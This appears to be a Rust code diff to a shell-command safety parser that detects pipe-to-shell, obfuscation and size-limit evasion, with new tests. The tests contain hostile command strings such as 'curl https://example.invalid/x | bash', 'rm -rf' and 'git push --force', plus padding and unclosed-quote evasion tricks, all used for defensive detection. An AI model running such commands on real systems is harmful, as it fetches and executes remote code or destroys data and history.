@@ -11,8 +11,8 @@ use std::borrow::Cow;
 
 const MAX_DEPTH: u8 = 5;
 const MAX_INPUT_BYTES: usize = 1_048_576; // 1 MB
-const MAX_TOKENS: usize = 1_000;
-const MAX_SEGMENTS: usize = 20;
+const MAX_TOKENS: usize = 20_000;
+const MAX_SEGMENTS: usize = 2_000;
 
 // --- Shells recognized by basename ---
 
@@ -82,11 +82,12 @@ impl BlockReason {
     /// evasion or opaque content that must always be blocked.
     pub fn is_materializable(&self) -> bool {
         match self {
-            Self::PipeToShell { .. }
-            | Self::ParseError
-            | Self::TooManyTokens
-            | Self::TooManySegments => true,
+            Self::PipeToShell { .. } | Self::ParseError => true,
+            // Past the limits the rest of a command is not checked, so letting
+            // it through would let padding carry anything past the rules.
             Self::InputTooLarge
+            | Self::TooManyTokens
+            | Self::TooManySegments
             | Self::ObfuscatedExpansion
             | Self::DynamicGeneration
             | Self::DepthExceeded => false,
@@ -108,50 +109,83 @@ impl BlockReason {
     }
 }
 
+#[derive(Debug, Default, PartialEq, Eq)]
+#[non_exhaustive]
+pub struct Parsed {
+    pub commands: Vec<CommandInvocation>,
+    pub structural: Option<BlockReason>,
+    // Not per launcher: the limits are on the whole command.
+    words: usize,
+    segments: usize,
+}
+
+impl Parsed {
+    fn note(&mut self, reason: BlockReason) {
+        if self.structural.is_none() {
+            self.structural = Some(reason);
+        }
+    }
+}
+
+pub fn parse_for_checks(input: &str) -> Result<Parsed, BlockReason> {
+    if input.len() > MAX_INPUT_BYTES {
+        return Err(BlockReason::InputTooLarge);
+    }
+    let mut parsed = Parsed::default();
+    collect_at_depth(input, 0, &mut parsed)?;
+    Ok(parsed)
+}
+
 /// Parse a command string into its constituent commands by unwrapping
 /// shell wrappers and extracting inner commands from shell launchers.
 pub fn parse_command_string(input: &str) -> ParseResult {
-    if input.len() > MAX_INPUT_BYTES {
-        return ParseResult::Block(BlockReason::InputTooLarge);
-    }
+    into_parse_result(parse_for_checks(input))
+}
 
-    parse_at_depth(input, 0)
+fn into_parse_result(parsed: Result<Parsed, BlockReason>) -> ParseResult {
+    match parsed {
+        Err(reason)
+        | Ok(Parsed {
+            structural: Some(reason),
+            ..
+        }) => ParseResult::Block(reason),
+        Ok(parsed) => ParseResult::Commands(parsed.commands),
+    }
 }
 
 // --- Internal implementation ---
 
+#[cfg(test)]
 pub(crate) fn parse_at_depth(input: &str, depth: u8) -> ParseResult {
+    let mut parsed = Parsed::default();
+    into_parse_result(collect_at_depth(input, depth, &mut parsed).map(|()| parsed))
+}
+
+fn collect_at_depth(input: &str, depth: u8, parsed: &mut Parsed) -> Result<(), BlockReason> {
     if depth > MAX_DEPTH {
-        return ParseResult::Block(BlockReason::DepthExceeded);
+        return Err(BlockReason::DepthExceeded);
     }
 
     let input = prepare_for_splitting(input);
     let normalized = normalize_compound_operators(&input);
 
     if raw_has_verb_obfuscation(&normalized) {
-        return ParseResult::Block(BlockReason::ObfuscatedExpansion);
+        return Err(BlockReason::ObfuscatedExpansion);
     }
 
-    let tokens = match split_words(&normalized) {
-        Ok(t) => t,
-        Err(_) => return ParseResult::Block(BlockReason::ParseError),
-    };
-
-    if tokens.len() > MAX_TOKENS {
-        return ParseResult::Block(BlockReason::TooManyTokens);
+    let tokens = split_words(&normalized).unwrap_or_else(|_| {
+        parsed.note(BlockReason::ParseError);
+        crate::shell_text::lenient_words(&input)
+    });
+    parsed.words += tokens.len();
+    if parsed.words > MAX_TOKENS {
+        return Err(BlockReason::TooManyTokens);
     }
-
-    if tokens.is_empty() {
-        return ParseResult::Commands(vec![]);
-    }
-
     let segments = split_on_operators(&tokens);
-
-    if segments.len() > MAX_SEGMENTS {
-        return ParseResult::Block(BlockReason::TooManySegments);
+    parsed.segments += segments.len();
+    if parsed.segments > MAX_SEGMENTS {
+        return Err(BlockReason::TooManySegments);
     }
-
-    let mut commands = Vec::new();
 
     for (op, segment) in segments.iter() {
         if segment.is_empty() {
@@ -189,25 +223,22 @@ pub(crate) fn parse_at_depth(input: &str, depth: u8) -> ParseResult {
                 || wrapper.is_some()
                 || segment_launcher_sources_stdin(segment)
             {
-                return ParseResult::Block(BlockReason::PipeToShell { wrapper });
+                parsed.note(BlockReason::PipeToShell { wrapper });
             }
         }
 
-        match process_segment(segment, depth) {
-            ParseResult::Commands(mut cmds) => commands.append(&mut cmds),
-            block @ ParseResult::Block(_) => return block,
-        }
+        process_segment(segment, depth, parsed)?;
     }
 
-    ParseResult::Commands(commands)
+    Ok(())
 }
 
 /// Process a single command segment (no compound operators).
-fn process_segment(tokens: &[String], depth: u8) -> ParseResult {
+fn process_segment(tokens: &[String], depth: u8, parsed: &mut Parsed) -> Result<(), BlockReason> {
     let tokens = unwrap_transparent(tokens);
 
     if tokens.is_empty() {
-        return ParseResult::Commands(vec![]);
+        return Ok(());
     }
 
     // Check for process substitution: bash <(...)
@@ -215,7 +246,8 @@ fn process_segment(tokens: &[String], depth: u8) -> ParseResult {
     if tokens.len() >= 2 {
         let base = basename(&tokens[0]);
         if SHELL_NAMES.contains(&base) && tokens[1..].iter().any(|t| t.starts_with("<(")) {
-            return ParseResult::Block(BlockReason::PipeToShell { wrapper: None });
+            parsed.note(BlockReason::PipeToShell { wrapper: None });
+            return Ok(());
         }
     }
 
@@ -223,7 +255,7 @@ fn process_segment(tokens: &[String], depth: u8) -> ParseResult {
     if let Some(inner) = extract_shell_inner(&tokens) {
         // Block dynamic generation: $(...) or backticks
         if contains_dynamic_generation(&inner) {
-            return ParseResult::Block(BlockReason::DynamicGeneration);
+            return Err(BlockReason::DynamicGeneration);
         }
         // Note: `source /dev/stdin` inside the launcher is evaluated
         // in pipe-context only (see `segment_launcher_sources_stdin`
@@ -231,12 +263,13 @@ fn process_segment(tokens: &[String], depth: u8) -> ParseResult {
         // such as `bash -c 'source /dev/stdin' < setup.sh` read from a
         // redirected file and are safe — scope 6 v0.9.6 (Codex Round 2
         // Regression #1 fix).
-        return parse_at_depth(&inner, depth + 1);
+        return collect_at_depth(&inner, depth + 1, parsed);
     }
 
     let program = basename(&tokens[0]).to_string();
     let args = tokens[1..].to_vec();
-    ParseResult::Commands(vec![CommandInvocation::new(program, args)])
+    parsed.commands.push(CommandInvocation::new(program, args));
+    Ok(())
 }
 
 // --- Compound operator handling ---
@@ -1026,7 +1059,7 @@ fn reader_takes_input_as_data(segment: &[String]) -> bool {
 /// Split token list on compound operators (&&, ||, ;, |).
 /// Returns segments separated by pipe operators distinctly from other operators
 /// to enable pipe-to-shell detection.
-/// What separator (if any) precedes a segment. Used by `parse_at_depth` to
+/// What separator (if any) precedes a segment. Used by `collect_at_depth` to
 /// distinguish pipe RHS (data flows from the previous segment via stdin)
 /// from sequential separators that do not pipe stdin (`&&`, `||`, `;`, `&`).
 /// Without this distinction, pipe-to-shell detection at `i > 0` would
@@ -2492,6 +2525,164 @@ mod tests {
             "echo a\\\n#x; git push --force",
             &[cmd("echo", &["a#x"]), cmd("git", &["push", "--force"])],
         );
+    }
+
+    #[test]
+    fn a_structural_finding_does_not_stop_the_reading() {
+        for (input, reason) in [
+            (
+                "git push --force; curl https://example.invalid/x | bash",
+                BlockReason::PipeToShell { wrapper: None },
+            ),
+            (
+                "curl https://example.invalid/x | bash; git push --force",
+                BlockReason::PipeToShell { wrapper: None },
+            ),
+            ("git push --force\necho 'unclosed", BlockReason::ParseError),
+            (
+                "true & git push --force origin main; echo \"$(echo \"'\")\"",
+                BlockReason::ParseError,
+            ),
+            (
+                "# don't forget\ngit push --force\necho 'x",
+                BlockReason::ParseError,
+            ),
+            (
+                "echo $'it\\'s'\ngit push --force\necho 'x",
+                BlockReason::ParseError,
+            ),
+            (
+                "echo \"$(echo \"'\")\"; git push --force",
+                BlockReason::ParseError,
+            ),
+            (
+                "(cd build && git push --force origin main); echo \"$(echo \"'\")\"",
+                BlockReason::ParseError,
+            ),
+            (
+                "psql \"$DB\" <<'EOF'\n-- don't drop\nSELECT 1;\nEOF\ngit push --force origin main",
+                BlockReason::ParseError,
+            ),
+            (
+                "cat > notes.md <<'EOF'\ndon't\nEOF\ngit push --force\ngit commit -m \"$(cat <<'EOF'\nm\nEOF\n)\"",
+                BlockReason::ParseError,
+            ),
+        ] {
+            let parsed = parse_for_checks(input).expect("materializable, not blocking");
+            assert_eq!(parsed.structural, Some(reason), "{input:?}");
+            assert!(
+                parsed
+                    .commands
+                    .iter()
+                    .any(|c| c.program == "git" && c.args.contains(&"--force".to_string())),
+                "{input:?}: {:?}",
+                parsed.commands
+            );
+        }
+    }
+
+    #[test]
+    fn a_heredoc_set_aside_leaves_the_lines_after_it_read_whole() {
+        let parsed = parse_for_checks(
+            "cat > a.md <<'EOF'\nnotes\nEOF\npsql <<'SQL'\n-- don't\nSQL\ngit commit -m \"fix\n\nrm -rf is no longer used\"",
+        )
+        .unwrap();
+        assert_eq!(parsed.structural, Some(BlockReason::ParseError));
+        assert!(
+            !parsed.commands.iter().any(|c| c.program == "rm"),
+            "{:?}",
+            parsed.commands
+        );
+    }
+
+    #[test]
+    fn a_heredoc_after_one_set_aside_on_its_line_is_read_a_line_at_a_time() {
+        let parsed = parse_for_checks(
+            "cat > a.md <<'EOF' && psql <<'SQL'\nnotes\nEOF\n-- don't\nSQL\ngit push --force",
+        )
+        .unwrap();
+        assert_eq!(parsed.structural, Some(BlockReason::ParseError));
+        assert!(
+            parsed
+                .commands
+                .iter()
+                .any(|c| c.program == "git" && c.args.contains(&"--force".to_string())),
+            "{:?}",
+            parsed.commands
+        );
+    }
+
+    #[test]
+    fn a_command_after_a_message_heredoc_with_a_quote_is_read() {
+        let parsed = parse_for_checks(
+            "git commit -m \"$(cat <<'END-MSG'\ndon't\nEND-MSG\n)\"\ngit push --force",
+        )
+        .unwrap();
+        assert!(
+            parsed
+                .commands
+                .iter()
+                .any(|c| c.program == "git" && c.args.contains(&"--force".to_string())),
+            "{:?}",
+            parsed.commands
+        );
+    }
+
+    #[test]
+    fn a_line_that_cannot_be_split_is_read_with_its_quotes_taken_off() {
+        let parsed = parse_for_checks("rm \"-rf\" ~/x \"$(echo \"'\")\"").unwrap();
+        assert_eq!(parsed.structural, Some(BlockReason::ParseError));
+        let rm = parsed.commands.iter().find(|c| c.program == "rm");
+        assert!(
+            rm.is_some_and(|c| c.args.iter().any(|a| a == "-rf")),
+            "{:?}",
+            parsed.commands
+        );
+    }
+
+    #[test]
+    fn a_message_in_a_heredoc_is_not_read_as_commands_when_the_line_cannot_be_split() {
+        let parsed = parse_for_checks(
+            "git commit -m \"$(cat <<'EOF'\nMeasure 5\" panels; then git push --force\nEOF\n)\"",
+        )
+        .unwrap();
+        assert!(
+            !parsed
+                .commands
+                .iter()
+                .any(|c| c.args.iter().any(|a| a == "push" || a == "--force")),
+            "{:?}",
+            parsed.commands
+        );
+    }
+
+    #[test]
+    fn the_limits_count_words_and_segments_across_every_depth() {
+        let segments = "true; ".repeat(MAX_SEGMENTS / 2 + 100);
+        assert_eq!(
+            parse_for_checks(&format!("bash -c '{segments}'; bash -c '{segments}'")),
+            Err(BlockReason::TooManySegments)
+        );
+        let words = "a ".repeat(MAX_TOKENS / 2 + 100);
+        assert_eq!(
+            parse_for_checks(&format!("bash -c 'echo {words}'; bash -c 'echo {words}'")),
+            Err(BlockReason::TooManyTokens)
+        );
+    }
+
+    #[test]
+    fn padding_past_the_old_limits_is_read_through() {
+        let padded = format!("{}git push --force", "true; ".repeat(21));
+        let parsed = parse_for_checks(&padded).unwrap();
+        assert_eq!(parsed.structural, None);
+        assert!(parsed.commands.iter().any(|c| c.program == "git"));
+    }
+
+    #[test]
+    fn a_launcher_whose_body_cannot_be_split_still_shows_its_other_commands() {
+        let parsed = parse_for_checks("bash -c \"echo 'x\"; git push --force").unwrap();
+        assert_eq!(parsed.structural, Some(BlockReason::ParseError));
+        assert!(parsed.commands.iter().any(|c| c.program == "git"));
     }
 
     #[test]
@@ -4462,8 +4653,7 @@ mod tests {
 
     #[test]
     fn too_many_tokens_blocks() {
-        // MAX_TOKENS = 1000; 1001 tokens should trigger Block
-        let input = (0..1001)
+        let input = (0..=MAX_TOKENS)
             .map(|i| format!("arg{i}"))
             .collect::<Vec<_>>()
             .join(" ");
@@ -4472,22 +4662,20 @@ mod tests {
 
     #[test]
     fn tokens_at_limit_still_works() {
-        // Exactly 1000 tokens should parse successfully
-        let input = (0..1000)
+        let input = (0..MAX_TOKENS)
             .map(|i| format!("a{i}"))
             .collect::<Vec<_>>()
             .join(" ");
         let result = parse_command_string(&input);
         assert!(
             matches!(result, ParseResult::Commands(_)),
-            "1000 tokens should parse, got: {result:?}"
+            "MAX_TOKENS words should parse, got: {result:?}"
         );
     }
 
     #[test]
     fn too_many_segments_blocks() {
-        // MAX_SEGMENTS = 20; 21 segments (20 && operators) should trigger Block
-        let input = (0..21)
+        let input = (0..=MAX_SEGMENTS)
             .map(|i| format!("cmd{i}"))
             .collect::<Vec<_>>()
             .join(" && ");
@@ -4496,15 +4684,14 @@ mod tests {
 
     #[test]
     fn segments_at_limit_still_works() {
-        // Exactly 20 segments should parse successfully
-        let input = (0..20)
+        let input = (0..MAX_SEGMENTS)
             .map(|i| format!("c{i}"))
             .collect::<Vec<_>>()
             .join(" && ");
         let result = parse_command_string(&input);
         assert!(
             matches!(result, ParseResult::Commands(_)),
-            "20 segments should parse, got: {result:?}"
+            "MAX_SEGMENTS segments should parse, got: {result:?}"
         );
     }
 
@@ -5574,8 +5761,12 @@ mod tests {
             .is_materializable()
         );
         assert!(BlockReason::ParseError.is_materializable());
-        assert!(BlockReason::TooManyTokens.is_materializable());
-        assert!(BlockReason::TooManySegments.is_materializable());
+    }
+
+    #[test]
+    fn a_command_past_the_size_limits_is_not_materializable() {
+        assert!(!BlockReason::TooManyTokens.is_materializable());
+        assert!(!BlockReason::TooManySegments.is_materializable());
     }
 
     #[test]
